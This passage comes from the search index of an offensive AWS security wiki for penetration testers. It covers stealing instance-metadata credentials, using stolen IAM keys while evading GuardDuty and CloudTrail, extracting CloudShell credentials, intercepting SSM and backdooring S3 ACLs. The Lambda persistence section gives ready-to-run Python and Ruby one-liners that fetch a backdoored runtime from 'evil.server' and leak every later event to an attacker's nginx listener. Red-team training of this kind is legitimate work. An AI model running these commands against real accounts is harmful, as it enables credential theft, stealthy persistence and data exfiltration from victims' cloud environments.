triggering an alert to our friendly neighborhood defender. They follow their runbooks which may borrow from the official AWS whitepaper on incident response. </p> <p>As part of the \"Isolate\" step, the typical goal is to isolate the affected EC2 instance with either a restrictive Security Group or an explicit Deny NACL. The slight problem with this is that NACLs affect the entire subnet, and if you are operating in a space with a ton of EC2 instances the defender is unlikely to want to cause an outage for all of them. As a result, swapping the Security Group is the recommended procedure.</p> <p>The defender switches the Security Group from the web and ssh one, to one that does not allow anything inbound or outbound.</p>  <p></p>  <p>The beauty of connection tracking is that because you've already established a connection with your shell, it will persist. So long as you ran the shell before the SG change, you can continue scouring the box and looking for other vulnerabilities.</p>  <p></p>  <p>To be clear, if the restrictive security group doesn't allow for any outbound rules we won't be able to communicate out (and if you're using a beaconing C2 that will not function).</p>  <p></p>","title":"Connection Tracking"},{"location":"aws/general-knowledge/create_a_console_session_from_iam_credentials/","text":"<p>Link to Tool: aws-vault Alternative Tool: leapp</p> <p>When performing an AWS assessment you will likely encounter IAM credentials. These credentials can be used with the AWS CLI or other tooling to query the AWS API. </p> <p>While this can be useful, sometimes you just can't beat clicking around the console. If you have IAM credentials, there is a way that you can spawn an AWS Console session using a tool such as aws-vault. This can make certain actions much easier rather than trying to remember the specific flag name for the AWS CLI.</p>  <p>Note</p> <p>If you are using temporary IAM credentials (ASIA...), for example, from an EC2 instance, you do not need to have any special IAM permissions to do this. If you are using long-term credentials (AKIA...), you need to have either sts:GetFederationToken or sts:AssumeRole permissions. This is to generate the temporary credentials you will need.</p>   <p>Tip</p> <p>If you are attempting to avoid detection, this technique is not recommended. Aside from the suspicious <code>ConsoleLogin</code> CloudTrail log, and the odd user-agent (Why is the IAM role associated with the CI/CD server using a Firefox user-agent string?), you will also generate a ton of CloudTrail logs.</p>  <p>To start, export the relevant environment variables for the IAM credentials you have. Next, install aws-vault.</p> <p>From here, perform the following commands depending on the type of credentials you have.</p>","title":"Create a Console Session from IAM Credentials"},{"location":"aws/general-knowledge/create_a_console_session_from_iam_credentials/#user-credentials","text":"<p>For long-term credentials (Those starting with AKIA), there is an extra step that must be completed first. You will need to generate temporary credentials to retrieve the sign in token. To do this, we will make use of sts:GetFederationToken. As an alternative, sts:AssumeRole can also be used.</p> <pre><code>aws sts get-federation-token --name blah\n</code></pre> <p>This will return temporary IAM credentials that you can use with the next step.</p>","title":"User Credentials"},{"location":"aws/general-knowledge/create_a_console_session_from_iam_credentials/#sts-credentials","text":"<p>For short-term credentials (Those starting with ASIA), you can run the following command:</p> <pre><code>aws-vault login\n</code></pre>  <p>Tip</p> <p>If you'd like to generate a link without it automatically opening a new tab in your browser you can use the <code>-s</code> flag and it will be printed to stdout.</p>  <p>To learn more about custom identity broker access to the AWS Console please see the official documentation.</p>","title":"STS Credentials"},{"location":"aws/general-knowledge/iam-key-identifiers/","text":"<p>Source</p>    Prefix Entity Type     ABIA AWS STS service bearer token   ACCA Context-specific credential   AGPA Group   AIDA IAM user   AIPA Amazon EC2 instance profile   AKIA Access key   ANPA Managed policy   ANVA Version in a managed policy   APKA Public key   AROA Role   ASCA Certificate   ASIA Temporary (AWS STS) keys","title":"IAM ID Identifiers"},{"location":"aws/general-knowledge/intro_metadata_service/","text":"<p>Every EC2 instance has access to the instance metadata service (IMDS) that contains metadata and information about that specific EC2 instance. In addition, if an IAM Role is associated with the EC2 instance, credentials for that role will be in the metadata service. Because of this, the instance metadata service is a prime target for attackers who gain access to an EC2 instance.</p>","title":"Introduction to the Instance Metadata Service"},{"location":"aws/general-knowledge/intro_metadata_service/#how-to-access-the-metadata-service","text":"<p>The metadata service can be accessed at <code>http://169.254.169.254/latest/meta-data/</code> from the EC2 instance. Alternatively, it can also be reached via IPv6 at <code>http://[fd00:ec2::254]/latest/meta-data/</code> however this only applies to Nitro EC2 instances.</p> <p>To get credentials, you will first need to make a request to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>. The response to this will return the name of the IAM role associated with the credentials. You then make a subsequent request to retrieve the IAM credentials at <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/*role_name*/</code>. </p>","title":"How to Access the Metadata Service"},{"location":"aws/general-knowledge/intro_metadata_service/#imdsv2","text":"<p>Version two of the metadata service has added protections against SSRF and requires the user to create and use a token. You can access it via the following.</p> <pre><code>user@host:~$ TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\nuser@host:~$ curl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/meta-data/\n</code></pre>","title":"IMDSv2"},{"location":"aws/general-knowledge/intro_metadata_service/#the-security-benefits-of-imdsv2","text":"<p>IMDSv2 offers a number of security improvements over the original. Wherever possible, IMDSv2 should be enforced over the original metadata service. These improvements take the following form:</p> <p>Session Authentication: In order to retrieve information from the metadata service a session must be created by sending a HTTP PUT request to retrieve a token value. After this, the token must be used for all subsequent requests. This mechanism effectively mitigates traditional Server Side Request Forgery attacks, as an attacker is unlikely to be able to send a PUT request.</p> <p>Blocks X-Forwarded-For Header: IMDSv2 will block requests to fetch a token that include the X-Forwarded-For header. This is to prevent misconfigured reverse proxies from being able to access it.</p> <p>TTL of 1: The default configuration of IMDSv2 is to set the Time To Live (TTL) of the TCP packet containing the session token to \"1\". This ensures that misconfigured network appliances (firewalls, NAT devices, routers, etc.) will not forward the packet on. This also means that Docker containers using the default networking configuration (bridge mode) will not be able to reach the instance metadata service.</p>  <p>Note</p> <p>While the default configuration of IMDSv2 will prevent a Docker container from being able to reach the metadata service, this can be configured via the \"hop limit.\"</p>","title":"The Security Benefits of IMDSv2"},{"location":"aws/general-knowledge/intro_metadata_service/#what-info-the-metadata-service-contains","text":"<p>The following information was pulled from here.</p>    Endpoint Description     ami-id The AMI ID used to launch the instance.   ami-launch-index If you started more than one instance at the same time, this value indicates the order in which the instance was launched. The value of the first instance launched is 0.   ami-manifest-path The path to the AMI manifest file in Amazon S3. If you used an Amazon EBS-backed AMI to launch the instance, the returned result is unknown.   hostname The private IPv4 DNS hostname of the instance. In cases where multiple network interfaces are present, this refers to the eth0 device (the device for which the device number is 0).   iam/info If there is an IAM role associated with the instance, contains information about the last time the instance profile was updated, including the instance's LastUpdated date, InstanceProfileArn, and InstanceProfileId. Otherwise, not present.   iam/security-credentials/role-name If there is an IAM role associated with the instance, role-name is the name of the role, and role-name contains the temporary security credentials associated with the role. Otherwise, not present.   identity-credentials/ec2/info [Internal use only] Information about the credentials in identity-credentials/ec2/security-credentials/ec2-instance. These credentials are used by AWS features such as EC2 Instance Connect, and do not have any additional AWS API permissions or privileges beyond identifying the instance.   instance-id The ID of this instance.   local-hostname The private IPv4 DNS hostname of the instance. In cases where multiple network interfaces are present, this refers to the eth0 device (the device for which the device number is 0).   local-ipv4 The private IPv4 address of the instance. In cases where multiple network interfaces are present, this refers to the eth0 device (the device for which the device number is 0).   public-hostname The instance's public DNS. This category is only returned if the enableDnsHostnames attribute is set to true.   public-ipv4 The public IPv4 address. If an Elastic IP address is associated with the instance, the value returned is the Elastic IP address.   public-keys/0/openssh-key Public key. Only available if supplied at instance launch time.   security-groups The names of the security groups applied to the instance.","title":"What Info the Metadata Service Contains"},{"location":"aws/general-knowledge/introduction_user_data/","text":"<p>Instance user data is used to run commands when an EC2 instance is first started or after it is rebooted (with some configuration). Because this script is typically used to install software and configure the instance, this can be an excellent source of information for us as attackers. After gaining access to an EC2 instance you should immediately grab the user data script to gain information on the environment.</p>  <p>Warning</p> <p>Although it should not be done, credentials/secrets often end up being stored in user data. From the AWS docs, \"Although you can only access instance metadata and user data from within the instance itself, the data is not protected by authentication or cryptographic methods. Anyone who has direct access to the instance, and potentially any software running on the instance, can view its metadata. Therefore, you should not store sensitive data, such as passwords or long-lived encryption keys, as user data.\"</p>","title":"Introduction to User Data"},{"location":"aws/general-knowledge/introduction_user_data/#how-to-access-ec2-user-data","text":"<p>User data can be accessed at <code>http://169.254.169.254/latest/user-data/</code> from the EC2 instance.</p>","title":"How to Access EC2 User Data"},{"location":"aws/general-knowledge/introduction_user_data/#imdsv2","text":"<p>Version two of the metadata service has added protections against SSRF and requires the user to create and use a token. You can access it via the following.</p> <pre><code>user@host:~$ TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\nuser@host:~$ curl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/user-data/\n</code></pre>","title":"IMDSv2"},{"location":"aws/general-knowledge/introduction_user_data/#api","text":"<p>Another option to gather user data is via the API. If you escalate privileges in an account, or simply compromise a user/role with sufficient permissions, you can query the AWS API to view the user data of specific EC2 instances. This requires you to know the instance-id of the target EC2 instance. To query the user data we will use the describe-instance-attribute action. The result will be base64 encoded.</p> <pre><code>user@host:~$ aws ec2 describe-instance-attribute --instance-id i-abc123... --attribute userData\n</code></pre>","title":"API"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/","text":"<p>As a Penetration Tester or Red Teamer it is likely you will stumble into AWS IAM credentials during an assessment. The following is a step by step guide on how you can use them, things to consider, and methods to avoid detection.</p>","title":"Using Stolen IAM Credentials"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#iam-credential-characteristics","text":"<p>In AWS there are typically two types of credentials you will be working with, long term (access keys) and short term.</p> <p>Long term credentials will have an access key that starts with <code>AKIA</code> and will be 20 characters long. In addition to the access key there will also be a secret access key which is 40 characters long. With these two keys, you can potentially make requests against the AWS API. As the name implies, these credentials have no specified lifespan and will be useable until they are intentionally disabled/deactivated. As a result, this makes them not recommended from a security perspective. Temporary security credentials are preferred.</p> <p>Temporary credentials, by comparison, will have an access key that starts with <code>ASIA</code>, be 20 characters long, and also have a 40 character secret key. In addition, temporary security credentials will also have a session token (sometimes referred to as a security token). The session token will be base64 encoded and quite long. With these 3 credentials combined you can potentially make requests to the AWS API. As the name implies, these credentials have a temporary lifespan that is determined when they were created. It can be as short as 15 minutes, and as long as several hours.</p>","title":"IAM Credential Characteristics"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#working-with-the-keys","text":"<p>After gathering the credentials you will likely want to use them with the AWS CLI. There are a few ways to do this, however setting them as environment variables is likely the easiest. </p> <p>To do this with long term credentials, set the following environment variables.</p> <pre><code>export AWS_ACCESS_KEY_ID=AKIAEXAMPLEEXAMPLEEE\nexport AWS_SECRET_ACCESS_KEY=EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLESEXAM\n</code></pre> <p>To do this with short term credentials, set the following environment variables.</p> <pre><code>export AWS_ACCESS_KEY_ID=ASIAEXAMPLEEXAMPLEEE\nexport AWS_SECRET_ACCESS_KEY=EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLESEXAM\nexport AWS_SESSION_TOKEN=EXAMPLEEXAMPLEEXAMPLE...&lt;snip&gt;\n</code></pre>  <p>Note</p> <p>You may also have to specify an AWS region. This can be globally set with the <code>aws configure</code> command or through the <code>AWS_REGION</code> environment variable.</p>","title":"Working with the Keys"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#determining-validity","text":"<p>Now that you have credentials and have them setup to use, how can you determine if they are valid (not expired or deactivated)? The simplest way would be to make use of the sts:GetCallerIdentity API call. This method is helpful because it will allow us to determine if the credentials are valid and it will also tell us useful information such as the name of the role/user associated with these credentials and the AWS account ID they belong to.</p> <p>As an added bonus, we can be confident this API call will always work. From the documentation, \"No permissions are required to perform this operation. If an administrator adds a policy to your IAM user or role that explicitly denies access to the sts:GetCallerIdentity action, you can still perform this operation\".</p> <pre><code>$ aws sts get-caller-identity\n{\n    \"UserId\": \"AROAEXAMPLEEXAMPLEEXA:Nick\",\n    \"Account\": \"123456789123\",\n    \"Arn\": \"arn:aws:sts::123456789123:assumed-role/blah/Nick\"\n}\n</code></pre>  <p>Tip</p> <p>For defensive security professionals, it may be worthwhile to alert on invocations of <code>sts:GetCallerIdentity</code> from identities that have no history of calling it. For example, if an application server in a production environment has never called it before, that may be an indication of compromise.</p> <p>It is worth noting that <code>sts:GetCallerIdentity</code> may be legitimately used by a large number of projects, and that individual developers may use it as well. To attempt to reduce the number of false positives, it would be best to only alert on identities which have no history of calling it.</p>","title":"Determining Validity"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#operational-security-considerations","text":"<p>If you are attempting to maintain stealth, <code>sts:GetCallerIdentity</code> may be a risk. This API call logs to CloudTrail which means that defenders will have a log with additional details that this occurred. To get around this, we can make use of data events.</p> <p>Data events are high-volume API calls for resources in an AWS account. Because of the number of times these APIs may be called, they are not logged to CloudTrail by default and in some cases they cannot be logged at all.</p> <p>An example of this would be sns:Publish. By making this API call (and supplying a valid AWS account ID) we can get similar information as <code>sts:GetCallerIdentity</code>.</p> <pre><code>$ aws sns publish --topic-arn arn:aws:sns:us-east-1:*account id*:aaa --message aaa\n\nAn error occurred (AuthorizationError) when calling the Publish operation: User: arn:aws:sts::123456789123:assumed-role/example_role/i-00000000000000000 is not authorized to perform: SNS:Publish on resource: arn:aws:sns:us-east-1:*account id*:aaa\n</code></pre> <p>For more information on this technique, please see its article.</p>","title":"Operational Security Considerations"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#avoiding-detection","text":"<p>There are situations where simply using the credentials could alert defenders to your presence. As a result, it is a good idea to be mindful of these circumstances to avoid being caught.</p>","title":"Avoiding Detection"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#guardduty-pentest-findings-and-cli-user-agents","text":"<p>If you are using a \"pentesting\" Linux distribution such as Kali Linux, Parrot Security, or Pentoo Linux you will immediately trigger a PenTest GuardDuty finding. This is because the AWS CLI will send along a user agent string which contains information about the operating system making the API call.</p> <p>In order to avoid this, it is best to make use of a \"safe\" operating system, such as Windows, Mac OS, or Ubuntu. If you are short on time, or simply MUST use one of these Linux distributions, you can modify your botocore library with a hard-coded user agent.</p>  <p>Tip</p> <p>Are you going up against an apex blue team who will detect anything? It may be a good idea to spoof a user agent string that one would expect in the environment. For example, if these IAM credentials belong to a developer who uses a Windows workstation, it would be very strange for API calls to suddenly start having a user agent with a Linux operating system.</p> <p>Defenders, this may also be worth looking into for detection purposes.</p>  <p>For more information on this, please see its article.</p>","title":"GuardDuty Pentest Findings and CLI User Agents"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#guardduty-credential-exfiltration","text":"<p>Note</p> <p>This section only applies to IAM credentials taken from the Instance Metadata Service of an EC2 instance. It does not apply to other IAM credentials.</p>  <p>When using IAM credentials taken from an EC2 instance, you run the risk of triggering the UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS GuardDuty finding. This finding alerts on scenarios in which IAM credentials from an EC2 instance are used from outside AWS (E.X your home IP address).</p> <p>This is particularly relevant in scenarios in which you have access to the IAM credentials, but not the host (Server Side Request Forgery).</p> <p>To get around this, we can make use of VPC Endpoints which will not trigger this alert. To make things easier, the SneakyEndpoints tool was developed to allow you to quickly stand up infrastructure to bypass this detection.</p> <p>For more information on this, please see its article.</p>","title":"GuardDuty Credential Exfiltration"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#situational-awareness","text":"<p>Now that you have everything set up and you know what to look out for, your next question may be, \"what is in this AWS account?\". If you are performing a no-knowledge assessment, and thus, don't have any insights into what services are running in the account, it makes it difficult to know what to target or look into.</p> <p>One option would be to enumerate the service-linked roles in the account. A service-linked role is a special kind of IAM role that allows an AWS service to perform actions in your account. Because of this, we can potentially enumerate them without authentication. </p> <p>From the previous validity checking step, we will know the AWS account ID we are operating in. That, combined with this technique will allow us to enumerate what services the AWS account uses. This can be helpful to answer questions such as, \"Is our target using GuardDuty? Is this account a part of an organization? Are they using containers (ECS, EKS), or are they using EC2?\".</p> <p>For more information on this, please see its article.</p>","title":"Situational Awareness"},{"location":"aws/post_exploitation/get_iam_creds_from_console_session/","text":"<p>Original Research: Christophe Tafani-Dereeper</p> <p>When performing a penetration test or red team assessment, it is not uncommon to gain access to a developer's machine. This presents an opportunity for you to jump into AWS infrastructure via credentials on the system. For a myriad of reasons you may not have access to credentials in the <code>.aws</code> folder, but instead have access to their browser's session cookies (for example via cookies.sqlite in FireFox).</p> <p>Gaining access to the Console is great, but it may not be ideal. You may want to use certain tools that would instead require IAM credentials.</p> <p>To get around this, we can leverage CloudShell. CloudShell exposes IAM credentials via an undocumented endpoint on port 1338. After loading session cookies from the victim into your browser, you can navigate to CloudShell and issue the following commands to get IAM credentials.</p> <pre><code>[user@cloudshell]$ TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\n\n[user@cloudshell]$ curl localhost:1338/latest/meta-data/container/security-credentials -H \"X-aws-ec2-metadata-token: $TOKEN\"\n</code></pre>","title":"Get IAM Credentials from a Console Session"},{"location":"aws/post_exploitation/intercept_ssm_communications/","text":"<p>Original Research: Nick Frichette Proof of Concept: GitHub</p> <p>The SSM Agent is responsible for allowing EC2 instances to communicate with SSM services. The agent authenticates with SSM via the IAM role and the credentials in the Metadata Service. As a result, if you gain access to an EC2 instance or its IAM credentials you can spoof the agent and intercept EC2 Messages and SSM Sessions.</p> <p>For an in depth explanation of how this works, please see the original research. </p>  <p>Warning</p> <p>The tools used in this page are proof of concept, and should not be used for serious use cases. If you create or find a more production-ready tool please open an issue.</p>","title":"Intercept SSM Communications"},{"location":"aws/post_exploitation/intercept_ssm_communications/#intercept-ec2-messages","text":"<p>The normal operations of the SSM Agent is to poll for messages it has been sent. We can abuse this functionality by frequently polling ourselves. Doing so, will increase the likelihood (to a near guarantee) that we receive the messages before the real SSM agent does.</p> <p>By abusing this functionality we can intercept the EC2 messages and response with our own output, allowing us to force a \"Success\" response.</p> <p>Using the ssm-send-command-interception.py PoC:</p>  <p></p>   <p></p>","title":"Intercept EC2 Messages"},{"location":"aws/post_exploitation/intercept_ssm_communications/#intercept-ssm-sessions","text":"<p>Normally the SSM Agent will spawn a WebSocket connection back to SSM. This first WebSocket is the control channel and is responsible for spawning the data channels (which actually process the information). Due to this setup, we can spawn our own control channel and intercept all incoming connections. This can allow us to intercept or modify the communications happening, and potentially allow us to intercept sensitive commands and credentials.</p> <p>Using the ssm-session-interception.py PoC:</p>  <p></p>","title":"Intercept SSM Sessions"},{"location":"aws/post_exploitation/lambda_persistence/","text":"<p>Original Research: Yuval Avrahami Link to Research: Unit 42: Gaining Persistency on Vulnerable Lambdas Additional Reading: Revisiting Lambda Persistence</p>  <p>Warning</p> <p>Depending on the specific runtime and tools available, you will likely have to change the approach taken to gain persistence in a Lambda function. The general concepts should serve as a guide for a more specific attack you develop.</p>  <p>After finding a remote code execution vulnerability in a Lambda function, you'll probably want to establish persistence. The steps to do this will depend on the specific runtime that is being used by the Lambda function. Below the Python and Ruby runtimes are used as an example.</p>  <p>Note</p> <p>See the \"Creating a Listener\" section at the bottom of this page for how to setup a listener for exfiltrated data.</p>","title":"Lambda Persistence"},{"location":"aws/post_exploitation/lambda_persistence/#python-runtime","text":"<p>After identifying that your target is using the Python runtime, you'll need a copy of the <code>/var/runtime/bootstrap.py</code> file. You can get this by either creating your own Lambda function and copying it, or by leaking it from the target Lambda function.</p> <p>Next, you'll want to modify this runtime with some logic to backdoor it. This can be simply done with a few lines such as the following:</p>  <p></p>   <p>Note</p> <p>You can customize what the backdoor does, depending on what you're looking to do. Maybe you want to leak a specific user's data. Maybe you just want Cookies. It's up to you!</p>  <p>With the <code>bootstrap.py</code> file backdoored, you'll want to host it in a location that is accessible for the Lambda function to pull down. </p> <p>The next step is creating a one-liner to pull down this modified code, as well as to terminate the current event in the Runtime API. This can be done by posting to a specific endpoint with the current request ID. All together, that code should look something like this:</p> <pre><code>import urllib3\nimport os\nhttp = urllib3.PoolManager()\n\n# Writing the new bootstrap to a file\nr = http.request('GET', 'https://evil.server/bootstrap.py')\nw = open('/tmp/bootstrap.py', 'w')\nw.write(r.data.decode('utf-8'))\nw.close()\n\n# Getting the current request ID\nr = http.request('GET', 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')\nrid = r.headers['Lambda-Runtime-Aws-Request-Id']\n\n# End the current event\nhttp.request('POST', f'http://127.0.0.1:9001/2018-06-01/runtime/invocation/{rid}/response', body='null', headers={'Content-Type':'application/x-www-form-urlencoded'})\n\n# Swap the runtimes\nos.system('python3 /tmp/bootstrap.py')\n</code></pre> <p>Or as a long one-liner (don't forget to change the hostname):</p> <pre><code>python3 -c \"import urllib3;import os;http = urllib3.PoolManager();r = http.request('GET', 'https://evil.server/bootstrap.py');w = open('/tmp/bootstrap.py', 'w');w.write(r.data.decode('utf-8'));w.close();r = http.request('GET', 'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next');rid = r.headers['Lambda-Runtime-Aws-Request-Id'];http.request('POST', f'http://127.0.0.1:9001/2018-06-01/runtime/invocation/{rid}/response', body='null', headers={'Content-Type':'application/x-www-form-urlencoded'});os.system('python3 /tmp/bootstrap.py')\"\n</code></pre> <p>From here on, all subsequent events should be leaked to the attacker. Remember that if the Lambda function is not used for 5-15 minutes, it will become \"cold\" and you will lose access to the persistence you've established. You can execute the function again to keep it \"warm\" or you can simply reestablish persistence.</p>","title":"Python Runtime"},{"location":"aws/post_exploitation/lambda_persistence/#ruby-runtime","text":"<p>After identifying that your target is using the Python runtime, you\u2019ll need a copy of the <code>/var/runtime/lib/runtime.rb</code> file. You can get this by either creating your own Lambda function and copying it, or by leaking it from the target Lambda function.</p> <p>Next, you\u2019ll want to modify this runtime with some logic to backdoor it. This can be simply done with a few lines such as the following:</p>  <p></p>   <p></p>  <p>With the <code>runtime.rb</code> file backdoored, you\u2019ll want to host it in a location that is accessible for the Lambda function to pull down. Note, you'll likely want to rename it to something like <code>run.rb</code>. This is because you'll want to create a symbolic link between everything in <code>/var/runtime/lib</code> to <code>/tmp</code>. This will ensure your modified <code>runtime.rb</code> file can access all the additional libraries it needs.</p> <p>The next step is creating a one-liner to create those symbolic links, pull down this modified code, and execute it as well as to terminate the current event in the Runtime API. This can be done by posting to a specific endpoint with the current request ID. All together, that code should look something like this:</p> <pre><code>require 'net/http'\n\n# Writing the new runtime to a file\nuri = URI('https://evil.server/run.rb')\nr = Net::HTTP.get_response(uri)\nFile.write('/tmp/run.rb', r.body)\n\n# Getting the current request ID\nuri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')\nr = Net::HTTP.get_response(uri)\nrid = r.header['Lambda-Runtime-Aws-Request-Id']\n\n# End the current request\nuri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+rid+'/response')\nNet::HTTP.post(uri, 'null')\n</code></pre> <p>Or as a long one-liner (don\u2019t forget to change the hostname, create the symbolic links, or execute the code in the background):</p> <pre><code>ln -s /var/runtime/lib/* /tmp &amp;&amp; ruby -e \"require 'net/http';uri = URI('https://evil.server/run.rb');r = Net::HTTP.get_response(uri);File.write('/tmp/run.rb', r.body);uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next');r = Net::HTTP.get_response(uri);rid = r.header['Lambda-Runtime-Aws-Request-Id'];uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+rid+'/response');Net::HTTP.post(uri, 'null')\" &amp;&amp; ruby /tmp/run.rb &amp;\n</code></pre> <p>From here on, all subsequent events should be leaked to the attacker. Remember that if the Lambda function is not used for 5-15 minutes, it will become \u201ccold\u201d and you will lose access to the persistence you\u2019ve established. You can execute the function again to keep it \u201cwarm\u201d or you can simply reestablish persistence.</p>","title":"Ruby Runtime"},{"location":"aws/post_exploitation/lambda_persistence/#creating-a-listener","text":"<p>How you receive leaked events is up to you. The author found that the simplest way was via post requests to an Nginx server. The configuration was simple. First, outside of the server block, include a line like <code>log_format postdata $request_body</code>.</p> <p>Next, include the following inside the server block:</p> <pre><code>location = /post {\n    access_log /var/log/nginx/postdata.log postdata;\n    proxy_pass http://127.0.0.1/post_extra;\n}\nlocation = /post_extra {\n    access_log off;\n    return 200;\n}\n</code></pre> <p>After restarting Nginx, all logs received via post requests should be stored in <code>/var/log/nginx/postdata.log</code>.</p>","title":"Creating a Listener"},{"location":"aws/post_exploitation/role-chain-juggling/","text":"<p>Original Research: Daniel Heinsen Link to Tool: GitHub</p> <p>When doing an assessment in AWS you may want to maintain access for an extended period of time. You may not have the ability to create a new IAM user, or create a new key for existing users. How else can you extend your access? Role Chain Juggling.</p> <p>Role chaining is a recognized functionality of AWS in that you can use one assumed role to assume another one. When this happens the expiration field of the credentials is refreshed. This allows us to keep refreshing credentials over an over again.</p> <p>Through this, you can extend your access by chaining assume-role calls.</p>  <p>Note</p> <p>You can chain the same role multiple times so long as the Trust Policy is configured correctly. Additionally, finding roles that can assume each other will allow you to cycle back and forth.</p>  <p>To automate this work Daniel Heinsen developed a tool to keep the juggling going.</p> <pre><code>user@host:$ ./aws_role_juggler.py -h\nusage: aws_role_juggler.py [-h] [-r ROLE_LIST [ROLE_LIST ...]]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -r ROLE_LIST [ROLE_LIST ...], --role-list ROLE_LIST [ROLE_LIST ...]\n</code></pre>","title":"Role Chain Juggling"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/","text":"<p>After escalating privileges in a target AWS account or otherwise gaining privileged access you may want to run commands on EC2 instances in the account. This article hopes to provide a quick and referenceable cheat sheet on how to do this via ssm:SendCommand or ssm:StartSession.</p>  <p>Tip</p> <p>By default, the commands that are issued are not logged to CloudTrail. Specifically they are \"HIDDEN_DUE_TO_SECURITY_REASONS\". As a result, if an adversary were to leverage this tactic against an environment, defenders would need to get information about those commands from host based controls. Defenders, this is an excellent capability to validate. Alternatively, offensive security teams can do the testing.</p>","title":"Run Shell Commands on EC2 with Send Command or Session Manager"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#send-command","text":"<p>Required IAM Permission: ssm:SendCommand Recommended But Not Strictly Required: ssm:ListCommandInvocations, ec2:DescribeInstances</p> <p>You can send arbitrary shell commands to EC2 instances from the AWS CLI via the following:</p> <pre><code>aws ssm send-command \\\n--instance-ids \"i-00000000000000000\" \\\n--document-name \"AWS-RunShellScript\"\n--parameters commands=\"*shell commands here*\"\n</code></pre> <p>If you're just looking to run a quick C2 payload, or perhaps create a new user this will likely be enough. However, if you also want to retrieve the output of the command you will need to make a ssm:ListCommandInvocations call as well.</p> <p>If you would like to retrieve the output, make a note of the <code>CommandId</code> returned to you in the Send Command call. After a short period of time (to let the command run) you can use this Id to lookup the results. You can do this with the following:</p> <pre><code>aws ssm list-command-invocations \\\n--command-id \"command_id_guid\" \\\n--details\n</code></pre>  <p>Note</p> <p>The <code>--details</code> is required to view the output of the command.</p>  <p>The output of the command will be in the <code>Output</code> section under <code>CommandPlugins</code>.</p>","title":"Send Command"},{"location":"aws/post_exploitation/run_shell_commands_on_ec2/#session-manager","text":"<p>Required IAM Permission: ssm:StartSession</p> <p>If instead you'd like a more interactive shell experience, you can make use of Session Manager. Session Manager allows you to have an SSH-esc experience, making it easy to interact with EC2 instances.</p> <p>To begin, you will first need to install the SSM Session Manager Plugin. The specifics of this will depend on what operating system you are using.</p> <p>With that installed, you can then run the following command to start an interactive session.</p> <pre><code>aws ssm start-session --target instance-id\n</code></pre>","title":"Session Manager"},{"location":"aws/post_exploitation/s3_acl_persistence/","text":"","title":"S3 File ACL Persistence"},{"location":"aws/post_exploitation/s3_acl_persistence/#requirements","text":"<p>For this scenario to work, you will need to have s3:PutBucketAcl, s3:PutObjectAcl, or PutObjectVersionAcl on the target s3 bucket or associated object.</p>","title":"Requirements"},{"location":"aws/post_exploitation/s3_acl_persistence/#purpose","text":"<p>When doing an assessment in AWS you may want to maintain access for an extended period of time, but you may not have the ability to create a new IAM user, create a new key for existing users, or even perform IAM role-chain juggling. How else can you extend your access? By backdooring key S3 resources using S3 Access Control Lists (ACLs).  </p>","title":"Purpose"},{"location":"aws/post_exploitation/s3_acl_persistence/#background-on-sensitive-s3-use-cases","text":"<p>Many organizations have grown to use AWS S3 to store Terraform state files, CloudFormation Templates, SSM scripts, application source code, and/or automation scripts used to manage specific account resources (EC2 instances, Lambda Functions, etc.)  During post-exploitation, you may identify opportunities to access these resources. Provisioning write, or in some cases read only access to these resources, may provide persistent access to credentials for the AWS account and/or resources provisioned in the account. Furthermore, write access specifically may allow an attacker to update configuration files, source code for applications, and/or automation code that modifies downstream resources in the account. On the next update/execution of the relevant data/code, this may allow an attacker to further extend access to other resources in the account, or even beyond the specific AWS account accessed. This brings us to the method: S3 ACL Access Control.  </p>","title":"Background on Sensitive S3 Use Cases"},{"location":"aws/post_exploitation/s3_acl_persistence/#technique","text":"<p>S3 ACL Access Control is a recognized functionality of AWS in that you can use an access control list to allow access to S3 buckets from outside your own AWS account without configuring an Identity-based or Resource-based IAM policy. While many organizations may be prepared to alert on S3 buckets made public via resource policy, this alerting may not extend to capabilities associated with bucket or object ACLs. Furthermore, subtler configurations that expose bucket or object resources to other accounts via ACLs may go undetected by organizations, even those with strong alerting capabilities. Using these permissions, you can extend your access by allowing other AWS accounts you control to read or write objects, buckets, and bucket ACLs. Furthermore, the access can be extended to AUTHENTICATED USERS, which is a term AWS uses to describe any AWS IAM principal in any other AWS account. The access can also be extended to ANY USER which is a term AWS uses to describe anonymous access that does not require authentication.</p>","title":"Technique"},{"location":"aws/post_exploitation/s3_acl_persistence/#key-considerations","text":"<ol> <li>Bucket Public Access Block will prevent S3 bucket ACLs from being configured to allow public (ANY USER) access. If configured, it will provide some limitations to this technique.</li> </ol>","title":"Key Considerations"},{"location":"aws/post_exploitation/user_data_script_persistence/","text":"<p>When using EC2 instances a common design pattern is to define a user data script to be run when an instance is first started or after a reboot. These scripts are typically used to install software, download a config, etc. Additionally these scripts are run as root or System which makes them even more useful. Should we gain access to an EC2 instance we 